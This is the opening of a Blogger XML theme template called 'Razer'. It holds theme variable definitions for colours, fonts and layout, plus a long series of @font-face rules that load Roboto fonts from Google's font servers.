<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE html>
<html b:css='false' b:defaultwidgetversion='2' b:layoutsVersion='3' b:responsive='true' b:templateVersion='1.3.0' expr:class='data:blog.languageDirection' expr:dir='data:blog.languageDirection' expr:lang='data:blog.localeUnderscoreDelimited' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
<b:include name='theme-dark-mode'/>
<head>
<b:include name='theme-head'/>
<b:if cond='!data:view.isLayoutMode'>
<!-- Theme CSS Style -->
<b:skin version='1.3.0'><![CDATA[

/* -----------------------------------------------
Blogger Template Style
Name    : Razer
License : Premium Version
Version : v1.0
Author  : Templateify
Paid By : https://www.mrjaz.com
----------------------------------------------- */

/*
<!-- Variable definitions -->
<Variable name="keycolor" description="Main Color" type="color" default="#0072ff" value="#0072ff"/>
<Group description="Theme Options">
    <Variable name="darkmode" description="Native Dark Mode" type="length" default="0px" min="0px" max="1px" value="0px"/>
    <Variable name="userdarkmode" description="User Dark Mode" type="length" default="1px" min="0px" max="1px" value="1px"/>
    <Variable name="fixedmenu" description="Fixed Menu" type="length" default="1px" min="0px" max="1px" value="1px"/>
    <Variable name="sidebar" description="Left Sidebar" type="length" default="0px" min="0px" max="1px" value="0px"/>
    <Variable name="fixedsidebar" description="Fixed Sidebar" type="length" default="1px" min="0px" max="1px" value="1px"/>
</Group>
<Group description="Theme Widths">
    <Variable name="boxed" description="Boxed Mode" type="length" default="0px" min="0px" max="1px" value="0px"/>
    <Variable name="row.width" description="Container Width" type="length" default="1073px" min="970px" max="1089px" value="1073px"/>
    <Variable name="sidebar.width" description="Sidebar Width" type="length" default="320px" min="250px" max="336px" value="320px"/>
</Group>
<Group description="Theme Fonts">
    <Variable name="main.font" description="Site Font" type="font" family="Roboto" default="normal 400 14px $(family)" value="normal 400 14px $(family)"/>
    <Variable name="menu.font" description="Menu Font" type="font" family="Roboto Condensed" default="normal 400 14px $(family)" value="normal 400 14px $(family)"/>
    <Variable name="title.font" description="Title Font" type="font" family="Roboto Condensed" default="normal 400 14px $(family)" value="normal 400 14px $(family)"/>
    <Variable name="text.font" description="Text Font" type="font" family="Roboto" default="normal 400 14px $(family)" value="normal 400 14px $(family)"/>
</Group>
<Group description="Background">
    <Variable name="background.color" description="Body Background" type="color" default="#F3F8FB"  value="#F3F8FB"/>
    <Variable name="body.background" description="Background" type="background" color="$(background.color)" default="$(color) none repeat fixed top left" value="$(color) none repeat fixed top left"/>
    <Variable name="outer.bg" description="Outer Wrapper Background" type="color" default="#F3F8FB"  value="#F3F8FB"/>
</Group>
<Group description="Theme Colors">
    <Variable name="main.color" description="Theme Color" type="color" default="#0072ff" value="#0072ff"/>
    <Variable name="title.color" description="Title Color" type="color" default="#15161A" value="#15161A"/>
    <Variable name="title.hover.color" description="Title Hover Color" type="color" default="$(main.color)" value="#0072ff"/>
    <Variable name="meta.color" description="Meta Color" type="color" default="#76767A" value="#76767A"/>
    <Variable name="text.color" description="Text Color" type="color" default="#47474A"  value="#47474A"/>
</Group>
<Group description="Topbar" selector=".topbar-items">
    <Variable name="topbar.bg" description="Topbar Background" type="color" default="#0072ff" value="#0072ff"/>
    <Variable name="topbar.color" description="Topbar Color" type="color" default="#ffffff" value="#ffffff"/>
    <Variable name="topbar.hover.color" description="Topbar Hover Color" type="color" default="#BDD0F2" value="#BDD0F2"/>
</Group>
<Group description="Site Header" selector="#header-wrapper">
    <Variable name="header.bg" description="Header Background" type="color" default="#FFFFFF" value="#FFFFFF"/>
    <Variable name="header.color" description="Header Color" type="color" default="$(title.color)" value="#15151A"/>
    <Variable name="header.hover.color" description="Header Hover Color" type="color" default="$(main.color)" value="#0072ff"/>
</Group>
<Group description="Sub Menu">
    <Variable name="submenu.bg" description="Sub Menu Background" type="color" default="#FFFFFF" value="#FFFFFF"/>
    <Variable name="submenu.color" description="Sub Menu Color" type="color" default="$(title.color)" value="#15161A"/>
    <Variable name="submenu.hover.color" description="Sub Menu Hover Color" type="color" default="$(main.color)" value="#0072ff"/>
</Group>
<Group description="Mega Menu">
    <Variable name="megamenu.bg" description="Mega Menu Background" type="color" default="$(submenu.bg)" value="#FFFFFF"/>
    <Variable name="megamenu.color" description="Mega Menu Color" type="color" default="$(submenu.color)" value="#15161A"/>
    <Variable name="megamenu.hover.color" description="MegaMenu Hover Color" type="color" default="$(main.color)" value="#0072ff"/>
</Group>
<Group description="Mobile Menu">
    <Variable name="mmenu.bg" description="Mobile Menu Background" type="color" default="#FFFFFF" value="#FFFFFF"/>
    <Variable name="mmenu.color" description="Mobile Menu Color" type="color" default="$(title.color)" value="#15161A"/>
    <Variable name="mmenu.hover.color" description="Mobile Menu Hover Color" type="color" default="$(main.color)" value="#0072ff"/>
</Group>
<Group description="Header ADS" selector="#header-ads-wrap">
    <Variable name="headerad.onpost" description="Show on Post Page" type="length" default="1px" min="0px" max="1px" value="1px"/>
</Group>
<Group description="Theme Widgets" select="#sidebar">
    <Variable name="widget.bg" description="Widget Background" type="color" default="#FFFFFF" value="#FFFFFF"/>
    <Variable name="wtitle.color" description="Widget Title Color" type="color" default="$(title.color)" value="#15161A"/>
</Group>
<Group description="Featured Widgets" select="#content-section-1">
    <Variable name="feat.title.bg" description="Featured Title Background" type="color" default="#10101a" value="#10101a"/>
    <Variable name="feat.title.color" description="Featured Title Color" type="color" default="#ffffff" value="#ffffff"/>
    <Variable name="feat.more.bg" description="Featured Button Background" type="color" default="$(main.color)" value="#0072ff"/>
    <Variable name="feat.more.color" description="Featured Button Color" type="color" default="#ffffff" value="#ffffff"/>
</Group>
<Group description="Post Styles" select="#main">
    <Variable name="post.title.color" description="Post Title Color" type="color" default="$(title.color)" value="#15161A"/>
    <Variable name="post.title.hover.color" description="Post Title Hover Color" type="color" default="$(title.hover.color)" value="#0072ff"/>
</Group>
<Group description="Post Page Styles" select="#main">
    <Variable name="post.text.color" description="Post Text Color" type="color" default="$(text.color)" value="#47474A"/>
    <Variable name="itempost.title.size" description="Post Title Font Size" type="length" default="37px" min="20px" max="50px" value="37px"/>
    <Variable name="itempost.content.size" description="Post Text Font Size" type="length" default="14px" min="12px" max="20px" value="14px"/>
</Group>
<Group description="Post Page Options" select="#main">
    <Variable name="breadcrumb" description="Post Breadcrumbs" type="length" default="1px" min="0px" max="1px" value="1px"/>
    <Variable name="cmm.count" description="Comments Count" type="length" default="1px" min="0px" max="1px" value="1px"/>
    <Variable name="postnav" description="Post Navigation" type="length" default="1px" min="0px" max="1px" value="1px"/>
</Group>
<Group description="Footer ADS" selector="#footer-ads-wrap">
    <Variable name="footerad.onpost" description="Show on Post Page" type="length" default="1px" min="0px" max="1px" value="1px"/>
</Group>
<Group description="Theme Footer" selector="#footer-wrapper">
    <Variable name="footer.bg" description="Footer Background" type="color" default="#010e2e" value="#010e2e"/>
    <Variable name="footer.color" description="Footer Color" type="color" default="#FFFFFF" value="#FFFFFF"/>
    <Variable name="footer.text.color" description="Footer Text Color" type="color" default="#BABABA" value="#BABABA"/>
    <Variable name="footer.hover.color" description="Footer Hover Color" type="color" default="$(main.color)" value="#0072ff"/>
</Group>
<Group description="Footer Bar" selector=".footerbar">
    <Variable name="footerbar.bg" description="Footer Bar Background" type="color" default="#020c24" value="#020c24"/>
    <Variable name="footerbar.color" description="Footer Bar Color" type="color" default="#FCFCFC" value="#FCFCFC"/>
    <Variable name="footerbar.hover.color" description="Footer Bar Hover Color" type="color" default="$(main.color)" value="#0072ff"/>
</Group>
<Group description="Cookie Consent" selector="#razer-pro-cookie-ify">
    <Variable name="cookie.bg" description="Cookie Background" type="color" default="#FFFFFF" value="#FFFFFF"/>
    <Variable name="cookie.color" description="Cookie Text Color" type="color" default="$(text.color)" value="#47474A"/>
</Group>
<Group description="Theme Buttons">
    <Variable name="button.bg" description="Button Background" type="color" default="$(main.color)" value="#0072ff"/>
    <Variable name="button.color" description="Button Color" type="color" default="#FFFFFF" value="#FFFFFF"/>
    <Variable name="button.hover.bg" description="Button Hover Background" type="color" default="#0036b5" value="#0036b5"/>
    <Variable name="button.hover.color" description="Button Hover Color" type="color" default="#FFFFFF" value="#FFFFFF"/>
</Group>
<Group description="Theme Fonts (Reset)">
    <!-- Site Font -->
    <Variable name="mainfont.italic" description="Main Font Italic" type="font" default="italic 400 14px $(main.font.family)" value="italic 400 14px $(family)"/>
    <Variable name="mainfont.medium" description="Main Font Medium" type="font" default="normal 500 14px $(main.font.family)" value="normal 500 14px $(family)"/>
    <Variable name="mainfont.mediumitalic" description="Main Font Medium Italic" type="font" default="italic 500 14px $(main.font.family)" value="italic 500 14px $(family)"/>
    <Variable name="mainfont.bold" description="Main Font Bold" type="font" default="normal 700 14px $(main.font.family)" value="normal 700 14px $(family)"/>
    <Variable name="mainfont.bolditalic" description="Main Font Bold Italic" type="font" default="italic 700 14px $(main.font.family)" value="italic 700 14px $(family)"/>
    <!-- Menu Font -->
    <Variable name="menufont.italic" description="Menu Font Italic" type="font" default="italic 400 14px $(menu.font.family)" value="italic 400 14px $(family)"/>
    <Variable name="menufont.bold" description="Menu Font Bold" type="font" default="normal 700 14px $(menu.font.family)" value="normal 700 14px $(family)"/>
    <Variable name="menufont.bolditalic" description="Menu Font Bold Italic" type="font" default="italic 700 14px $(menu.font.family)" value="italic 700 14px $(family)"/>
    <!-- Title Font -->
    <Variable name="titlefont.italic" description="Title Font Italic" type="font" default="italic 400 14px $(title.font.family)" value="italic 400 14px $(family)"/>
    <Variable name="titlefont.bold" description="Title Font Bold" type="font" default="normal 700 14px $(title.font.family)" value="normal 700 14px $(family)"/>
    <Variable name="titlefont.bolditalic" description="Title Font Bold Italic" type="font" default="italic 700 14px $(title.font.family)" value="italic 700 14px $(family)"/>
    <!-- Text Font -->
    <Variable name="textfont.italic" description="Text Font Italic" type="font" default="italic 400 14px $(text.font.family)" value="italic 400 14px $(family)"/>
    <Variable name="textfont.medium" description="Text Font Medium" type="font" default="normal 500 14px $(text.font.family)" value="normal 500 14px $(family)"/>
    <Variable name="textfont.mediumitalic" description="Text Font Medium Italic" type="font" default="italic 500 14px $(text.font.family)" value="italic 500 14px $(family)"/>
    <Variable name="textfont.bold" description="Text Font Bold" type="font" default="normal 700 14px $(text.font.family)" value="normal 700 14px $(family)"/>
    <Variable name="textfont.bolditalic" description="Text Font Bold Italic" type="font" default="italic 700 14px $(text.font.family)" value="italic 700 14px $(family)"/>
</Group>
<!-- Hidden Variables -->
<Variable name="body.background.color" description="Comments Background" hideEditor="true" type="color" default="rgba(255,255,255,0)"  value="rgba(255,255,255,0)"/>
<Variable name="body.title.color" description="Comments Color" hideEditor="true" type="color" default="$(title.color)" value="#15161A"/>
<Variable name="body.text.color" description="Comments Text Color" hideEditor="true" type="color" default="$(text.color)"  value="#47474A"/>
<Variable name="body.link.color" description="Comments Link Color" hideEditor="true" type="color" default="$(main.color)"  value="#0072ff"/>
<Variable name="body.text.font" description="Comments Font 1" hideEditor="true" type="font" default="normal 400 14px roboto, Arial, sans-serif !important"  value="normal 400 14px roboto, Arial, sans-serif !important"/>
<Variable name="body.action.font.large" description="Comments Font 2" hideEditor="true" type="font" default="normal 700 14px roboto, Arial, sans-serif !important"  value="normal 700 14px roboto, Arial, sans-serif !important"/>
*/
/*-- Google Fonts --*/
@font-face{font-family:'Roboto';font-style:italic;font-weight:400;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOkCnqEu92Fr1Mu51xFIzIFKw.woff2) format("woff2");unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}
@font-face{font-family:'Roboto';font-style:italic;font-weight:400;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOkCnqEu92Fr1Mu51xMIzIFKw.woff2) format("woff2");unicode-range:U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}
@font-face{font-family:'Roboto';font-style:italic;font-weight:400;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOkCnqEu92Fr1Mu51xEIzIFKw.woff2) format("woff2");unicode-range:U+1F00-1FFF}
@font-face{font-family:'Roboto';font-style:italic;font-weight:400;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOkCnqEu92Fr1Mu51xLIzIFKw.woff2) format("woff2");unicode-range:U+0370-03FF}
@font-face{font-family:'Roboto';font-style:italic;font-weight:400;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOkCnqEu92Fr1Mu51xHIzIFKw.woff2) format("woff2");unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+1EA0-1EF9,U+20AB}
@font-face{font-family:'Roboto';font-style:italic;font-weight:400;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOkCnqEu92Fr1Mu51xGIzIFKw.woff2) format("woff2");unicode-range:U+0100-024F,U+0259,U+1E00-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF}
@font-face{font-family:'Roboto';font-style:italic;font-weight:400;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOkCnqEu92Fr1Mu51xIIzI.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}
@font-face{font-family:'Roboto';font-style:italic;font-weight:500;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOjCnqEu92Fr1Mu51S7ACc3CsTKlA.woff2) format("woff2");unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}
@font-face{font-family:'Roboto';font-style:italic;font-weight:500;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOjCnqEu92Fr1Mu51S7ACc-CsTKlA.woff2) format("woff2");unicode-range:U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}
@font-face{font-family:'Roboto';font-style:italic;font-weight:500;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOjCnqEu92Fr1Mu51S7ACc2CsTKlA.woff2) format("woff2");unicode-range:U+1F00-1FFF}
@font-face{font-family:'Roboto';font-style:italic;font-weight:500;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOjCnqEu92Fr1Mu51S7ACc5CsTKlA.woff2) format("woff2");unicode-range:U+0370-03FF}
@font-face{font-family:'Roboto';font-style:italic;font-weight:500;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOjCnqEu92Fr1Mu51S7ACc1CsTKlA.woff2) format("woff2");unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+1EA0-1EF9,U+20AB}
@font-face{font-family:'Roboto';font-style:italic;font-weight:500;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOjCnqEu92Fr1Mu51S7ACc0CsTKlA.woff2) format("woff2");unicode-range:U+0100-024F,U+0259,U+1E00-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF}
@font-face{font-family:'Roboto';font-style:italic;font-weight:500;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOjCnqEu92Fr1Mu51S7ACc6CsQ.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}
@font-face{font-family:'Roboto';font-style:italic;font-weight:700;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOjCnqEu92Fr1Mu51TzBic3CsTKlA.woff2) format("woff2");unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}
@font-face{font-family:'Roboto';font-style:italic;font-weight:700;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOjCnqEu92Fr1Mu51TzBic-CsTKlA.woff2) format("woff2");unicode-range:U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}
@font-face{font-family:'Roboto';font-style:italic;font-weight:700;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOjCnqEu92Fr1Mu51TzBic2CsTKlA.woff2) format("woff2");unicode-range:U+1F00-1FFF}
@font-face{font-family:'Roboto';font-style:italic;font-weight:700;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOjCnqEu92Fr1Mu51TzBic5CsTKlA.woff2) format("woff2");unicode-range:U+0370-03FF}
@font-face{font-family:'Roboto';font-style:italic;font-weight:700;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOjCnqEu92Fr1Mu51TzBic1CsTKlA.woff2) format("woff2");unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+1EA0-1EF9,U+20AB}
@font-face{font-family:'Roboto';font-style:italic;font-weight:700;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOjCnqEu92Fr1Mu51TzBic0CsTKlA.woff2) format("woff2");unicode-range:U+0100-024F,U+0259,U+1E00-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF}
@font-face{font-family:'Roboto';font-style:italic;font-weight:700;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOjCnqEu92Fr1Mu51TzBic6CsQ.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}
@font-face{font-family:'Roboto';font-style:normal;font-weight:400;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOmCnqEu92Fr1Mu72xKOzY.woff2) format("woff2");unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}
@font-face{font-family:'Roboto';font-style:normal;font-weight:400;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOmCnqEu92Fr1Mu5mxKOzY.woff2) format("woff2");unicode-range:U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}
@font-face{font-family:'Roboto';font-style:normal;font-weight:400;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOmCnqEu92Fr1Mu7mxKOzY.woff2) format("woff2");unicode-range:U+1F00-1FFF}
@font-face{font-family:'Roboto';font-style:normal;font-weight:400;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOmCnqEu92Fr1Mu4WxKOzY.woff2) format("woff2");unicode-range:U+0370-03FF}
@font-face{font-family:'Roboto';font-style:normal;font-weight:400;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOmCnqEu92Fr1Mu7WxKOzY.woff2) format("woff2");unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+1EA0-1EF9,U+20AB}
@font-face{font-family:'Roboto';font-style:normal;font-weight:400;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOmCnqEu92Fr1Mu7GxKOzY.woff2) format("woff2");unicode-range:U+0100-024F,U+0259,U+1E00-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF}
@font-face{font-family:'Roboto';font-style:normal;font-weight:400;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOmCnqEu92Fr1Mu4mxK.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}
@font-face{font-family:'Roboto';font-style:normal;font-weight:500;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOlCnqEu92Fr1MmEU9fCRc4EsA.woff2) format("woff2");unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}
@font-face{font-family:'Roboto';font-style:normal;font-weight:500;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOlCnqEu92Fr1MmEU9fABc4EsA.woff2) format("woff2");unicode-range:U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}
@font-face{font-family:'Roboto';font-style:normal;font-weight:500;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOlCnqEu92Fr1MmEU9fCBc4EsA.woff2) format("woff2");unicode-range:U+1F00-1FFF}
@font-face{font-family:'Roboto';font-style:normal;font-weight:500;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOlCnqEu92Fr1MmEU9fBxc4EsA.woff2) format("woff2");unicode-range:U+0370-03FF}
@font-face{font-family:'Roboto';font-style:normal;font-weight:500;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOlCnqEu92Fr1MmEU9fCxc4EsA.woff2) format("woff2");unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+1EA0-1EF9,U+20AB}
@font-face{font-family:'Roboto';font-style:normal;font-weight:500;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOlCnqEu92Fr1MmEU9fChc4EsA.woff2) format("woff2");unicode-range:U+0100-024F,U+0259,U+1E00-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF}
@font-face{font-family:'Roboto';font-style:normal;font-weight:500;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOlCnqEu92Fr1MmEU9fBBc4.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}
@font-face{font-family:'Roboto';font-style:normal;font-weight:700;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOlCnqEu92Fr1MmWUlfCRc4EsA.woff2) format("woff2");unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}
@font-face{font-family:'Roboto';font-style:normal;font-weight:700;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOlCnqEu92Fr1MmWUlfABc4EsA.woff2) format("woff2");unicode-range:U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}
@font-face{font-family:'Roboto';font-style:normal;font-weight:700;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOlCnqEu92Fr1MmWUlfCBc4EsA.woff2) format("woff2");unicode-range:U+1F00-1FFF}
@font-face{font-family:'Roboto';font-style:normal;font-weight:700;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOlCnqEu92Fr1MmWUlfBxc4EsA.woff2) format("woff2");unicode-range:U+0370-03FF}
@font-face{font-family:'Roboto';font-style:normal;font-weight:700;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOlCnqEu92Fr1MmWUlfCxc4EsA.woff2) format("woff2");unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+1EA0-1EF9,U+20AB}
@font-face{font-family:'Roboto';font-style:normal;font-weight:700;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOlCnqEu92Fr1MmWUlfChc4EsA.woff2) format("woff2");unicode-range:U+0100-024F,U+0259,U+1E00-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF}
@font-face{font-family:'Roboto';font-style:normal;font-weight:700;src:url(https://fonts.gstatic.com/s/roboto/v20/KFOlCnqEu92Fr1MmWUlfBBc4.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}
@font-face{font-family:'Roboto Condensed';font-style:italic;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/robotocondensed/v19/ieVj2ZhZI2eCN5jzbjEETS9weq8-19eLAgM9UvI.woff2) format("woff2");unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}
@font-face{font-family:'Roboto Condensed';font-style:italic;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/robotocondensed/v19/ieVj2ZhZI2eCN5jzbjEETS9weq8-19eLCwM9UvI.woff2) format("woff2");unicode-range:U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}
@font-face{font-family:'Roboto Condensed';font-style:italic;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/robotocondensed/v19/ieVj2ZhZI2eCN5jzbjEETS9weq8-19eLAwM9UvI.woff2) format("woff2");unicode-range:U+1F00-1FFF}
@font-face{font-family:'Roboto Condensed';font-style:italic;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/robotocondensed/v19/ieVj2ZhZI2eCN5jzbjEETS9weq8-19eLDAM9UvI.woff2) format("woff2");unicode-range:U+0370-03FF}
@font-face{font-family:'Roboto Condensed';font-style:italic;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/robotocondensed/v19/ieVj2ZhZI2eCN5jzbjEETS9weq8-19eLAAM9UvI.woff2) format("woff2");unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+1EA0-1EF9,U+20AB}
@font-face{font-family:'Roboto Condensed';font-style:italic;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/robotocondensed/v19/ieVj2ZhZI2eCN5jzbjEETS9weq8-19eLAQM9UvI.woff2) format("woff2");unicode-range:U+0100-024F,U+0259,U+1E00-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF}
@font-face{font-family:'Roboto Condensed';font-style:italic;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/robotocondensed/v19/ieVj2ZhZI2eCN5jzbjEETS9weq8-19eLDwM9.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}
@font-face{font-family:'Roboto Condensed';font-style:italic;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/robotocondensed/v19/ieVg2ZhZI2eCN5jzbjEETS9weq8-19eDtCYoYNNZQyQ.woff2) format("woff2");unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}
@font-face{font-family:'Roboto Condensed';font-style:italic;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/robotocondensed/v19/ieVg2ZhZI2eCN5jzbjEETS9weq8-19eDtCYoadNZQyQ.woff2) format("woff2");unicode-range:U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}
@font-face{font-family:'Roboto Condensed';font-style:italic;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/robotocondensed/v19/ieVg2ZhZI2eCN5jzbjEETS9weq8-19eDtCYoYdNZQyQ.woff2) format("woff2");unicode-range:U+1F00-1FFF}
@font-face{font-family:'Roboto Condensed';font-style:italic;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/robotocondensed/v19/ieVg2ZhZI2eCN5jzbjEETS9weq8-19eDtCYobtNZQyQ.woff2) format("woff2");unicode-range:U+0370-03FF}
@font-face{font-family:'Roboto Condensed';font-style:italic;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/robotocondensed/v19/ieVg2ZhZI2eCN5jzbjEETS9weq8-19eDtCYoYtNZQyQ.woff2) format("woff2");unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+1EA0-1EF9,U+20AB}
@font-face{font-family:'Roboto Condensed';font-style:italic;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/robotocondensed/v19/ieVg2ZhZI2eCN5jzbjEETS9weq8-19eDtCYoY9NZQyQ.woff2) format("woff2");unicode-range:U+0100-024F,U+0259,U+1E00-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF}
@font-face{font-family:'Roboto Condensed';font-style:italic;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/robotocondensed/v19/ieVg2ZhZI2eCN5jzbjEETS9weq8-19eDtCYobdNZ.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}
@font-face{font-family:'Roboto Condensed';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/robotocondensed/v19/ieVl2ZhZI2eCN5jzbjEETS9weq8-19-7DRs5.woff2) format("woff2");unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}
@font-face{font-family:'Roboto Condensed';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/robotocondensed/v19/ieVl2ZhZI2eCN5jzbjEETS9weq8-19a7DRs5.woff2) format("woff2");unicode-range:U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}
